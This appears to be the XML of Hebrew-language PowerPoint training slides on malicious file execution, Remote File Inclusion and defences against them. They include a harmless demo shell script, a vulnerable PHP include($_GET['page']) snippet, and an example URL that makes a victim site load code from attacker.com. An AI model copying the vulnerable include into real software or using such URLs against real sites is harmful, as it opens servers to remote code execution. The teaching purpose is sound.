              <a:rPr lang="en-US" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t>Social Engineering</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שימוש במניפולציה פסיכולוגית כדי לגרום לקורבן להוריד ולהפעיל קובץ זדוני.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>דוגמה: תוקף מתחזה לאיש תמיכה טכנית ומבקש מהקורבן להוריד קובץ כדי "לתקן בעיה".</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="180042424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4158768-BB39-4654-9E9A-49D1735F7B9A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="646043" y="642594"/>
            <a:ext cx="11111948" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הגנות והתמודדות עם </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Malicious File Execution</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{15334B84-A476-49EA-A156-594E59B3DEAE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. אנטי-וירוס ומערכות הגנה אוטומטיות: שימוש בתוכנות אנטי-וירוס מעודכנות שיכולות לזהות ולהסיר קבצים זדוניים באופן אוטומטי. ויש גם כלים נוספים כמו חומות אש אישיות יכולים לעקוב אחרי תעבורת רשת חשודה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. מדיניות אבטחה ארגונית: ארגונים צריכים להגדיר מדיניות נוקשה למניעת הרצת קבצים ממקורות לא מאובטחים, כמו לדוגמה, הגבלת הפעלת מאקרו בקבצי </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Office</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> או חסימת התקנת תוכנות שלא אושרו.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. חינוך והסברה: חינוך המשתמשים על הסכנות שבפתיחת קבצים מצורפים ממקורות לא מוכרים או הורדת תוכנות ממקורות לא מהימנים. וגם הדרכה על איך לזהות ניסיונות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פישינג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>ונוזקות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. ביצוע בדיקות קבצים בסביבה מבודדת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Sandboxing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: ביצוע הרצת קבצים חשודים בסביבה מבודדת לפני הפעלתם במערכת הראשית כדי לראות אם הם זדוניים. כלים כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Cuckoo Sandbox</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מאפשרים להריץ קבצים בסביבה וירטואלית כדי לנתח את פעולתם</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="118614323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FFEB01-0658-42F8-BAE7-D5E9B782EDE3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2623930" y="642594"/>
            <a:ext cx="8501270" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שאלות - הפעלה זדונית של קבצים </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4E3A414B-A9F3-462B-B529-9EDE61804D84}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. מהן הדרכים המרכזיות להפצת קבצים זדוניים, ומהן </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>ההגנות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> האפשריות לכל אחת מהן?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. איך התקפות כמו הזרקת קוד </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Code Injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> יכולות לנצל </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פגיעויות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> קיימות במערכת או בקבצים?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. באילו אמצעים ניתן להשתמש כדי למנוע הפעלה אוטומטית של קבצים זדוניים במערכת?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4310635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01767DB-2B59-46EA-B593-EFDB96B48470}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7136297" y="264907"/>
            <a:ext cx="3988903" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>יצירת קוד זדוני:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5EF5A139-C1B5-4C0E-9215-96413EEEF6E5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1106558" y="1510222"/>
            <a:ext cx="10058400" cy="5082871"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. ניצור סקריפט </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Bash</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שמדמה קובץ זדוני. הוא יבצע פעולה פשוטה כמו יצירת קובץ חדש במערכת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>פתח טרמינל בקלי לינוקס.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ניצור קובץ סקריפט חדש שנקרא </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>malicious.sh</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>nano</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> malicious.sh</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הכנס את הקוד הבא לתוך הקובץ:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Echo “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>you make bad code</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> “</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>touch /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tmp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>malicious_file</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>echo “ha </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ha</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ha</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ha</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תלחץ על </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Ctrl + X</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ואז </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Y</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ואז </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>ENTER</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> בכדי לשמור את הקובץ</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ואז </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>תהפוץ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> את הקובץ לסוג </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>קובת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מורץ</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>chmod</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> +x malicious.sh</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תריץ את הקובץ</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>./malicious.sh</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ותבדוק אם נוצר לך הקובץ </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>ls /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tmp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>malicious_file</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3932842281"/>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23626878-E32C-4CCC-9E9B-7627B42F5D0B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="6000" dirty="0"/>
              <a:t>Remote File Inclusion (RFI) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="6000" dirty="0"/>
              <a:t>להפעיל קובץ מרחוק</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="277801381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B291EAB-111B-4AE2-A9B9-B6B4BFA0036A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1351722" y="642594"/>
            <a:ext cx="9773478" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מה זה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> ?Remote File Inclusion(RFI)</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F56C6170-EF36-465E-A047-38BCBEC18A72}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="967409" y="2610015"/>
            <a:ext cx="10058400" cy="3931920"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> Remote File Inclusion (RFI)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>היא פגיעות באבטחת מידע שמאפשרת לתוקף להכניס ולהפעיל קובץ מרוחק על שרת. זה קורה כאשר יישום אינטרנטי מאפשר להכניס קובץ מהאינטרנט לתוך הקוד המקומי של האתר, דרך פרמטרים כמו כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> או קלט משתמש אחר. הפגיעות הזאת מסוכנת מאוד כי היא מאפשרת לתוקף להכניס קוד זדוני ישירות לתוך השרת, מה שעלול להוביל להשתלטות מלאה על המערכת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="11117366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6C97C5-DE45-4707-BF64-CEB638C71556}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7116417" y="254968"/>
            <a:ext cx="4008783" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כיצד </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>RFI</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> עובד?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0F49924F-CC04-497B-99EE-C9E7CA77E63B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1351721"/>
            <a:ext cx="10058400" cy="5357191"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הבסיס הטכני:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> תאר לעצמך אתר אינטרנט שמאפשר למשתמשים לבחור איזו שפה להציג. לפעמים, הבחירה הזאת נשמרת בפרמטר </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כמו ?</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>lang</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>english</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> השרת משתמש בפרמטר הזה כדי לטעון קובץ מתאים שמכיל את הטקסטים בשפה הנבחרת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אבל אם האתר לא מוודא שהקובץ שהוא טוען מגיע מתוך ספריית הקבצים שלו, התוקף יכול לשנות את הפרמטר הזה ולהפנות לקובץ אחר שנמצא בשרת אחר לחלוטין, כמו: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>http://malicious-site.com/badfile.php=lang</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>?</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ברגע שהקובץ המרוחק נטען, הוא מבוצע על השרת כאילו היה חלק מקוד האתר.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>דוגמה בסיסית: נניח שיש לנו אתר שמריץ את הקוד הבא (פשוט מדי, אבל ממחיש את הרעיון):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;?php</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>include($_GET['page']);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>?&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>האתר מקבל את הפרמטר </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>PAGE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>URL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>, ואז טוען את הקובץ המתאים. אם התוקף מעביר ל-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>URL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> משהו כזה:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>http://victim-site.com/?page=http://attacker.com/malicious.php</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>האתר יטען ויבצע את הקובץ המרוחק.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מה יכול תוקף לעשות? תוקף יכול להעלות קובץ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> PHP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>זדוני שמכיל קוד המאפשר לו להשתלט על השרת, כמו פתיחת דלת אחורית </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>backdoor</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שתאפשר לו גישה מרחוק לשרת בכל זמן שירצה.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="24076890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178D76A-EEBF-41AD-87BC-FB6168B1C086}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6096000" y="642594"/>
            <a:ext cx="5029200" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>איך להתגונן מ-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>?RFI</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D1C5BEA9-0278-41B2-BCC5-BB8C8FA23686}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הגבלת הקבצים שנטענים:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ודא שהקבצים שנטענים דרך פרמטרים כמו</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> =PAGE? </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הם רק קבצים שנמצאים בספרייה מסוימת על השרת.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>השתמש במסלולים יחסיים:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> במקום לקבל את הנתיב המלא מהמשתמש, השתמש במסלול יחסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
